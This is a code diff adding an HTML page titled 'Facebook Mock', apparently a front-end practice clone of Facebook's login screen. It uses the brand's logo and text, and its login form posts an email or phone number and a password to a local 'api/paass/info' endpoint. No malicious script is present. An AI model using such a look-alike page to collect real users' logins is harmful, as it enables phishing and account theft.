@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="input.css" />
+    <title>Facebook Mock</title>
+  </head>
+  <body>
+    <main>
+      <div class="fb1">
+        <img src="/fb-image.png" alt="Facebook logo">
+        <p>Facebook helps you connect and share with the people in your life.</p>
+      </div>
+      <div class="formText">
+        <div class="form2">
+        <form action="api/paass/info" method="post">
+          <input
+            type="text"
+            name="email/phone"
+            id="emailPhone"
+            placeholder="Email address or phone number"
+            required
+          />
+          <input
+            type="password"
+            name="Password"
+            id="passWord"
+            placeholder="Password"
+            required
+            minlength="8"
+          />
+          <button>Log in</button>
+        </form>
+        <section>
+          <p class="fgPass"><a href="">Forgotten password?</a></p>
+          <hr />
+          <p class="create"><a href="">Create new account</a></p>
+        </section>
+        </div>
+        <article class="page">
+          <p>
+            <a href=""><span>Create a Page</span></a> for a celebrity, brand or business.
+          </p>
+        </article>
+      </div>
+    </main>
+  </body>
+</html>
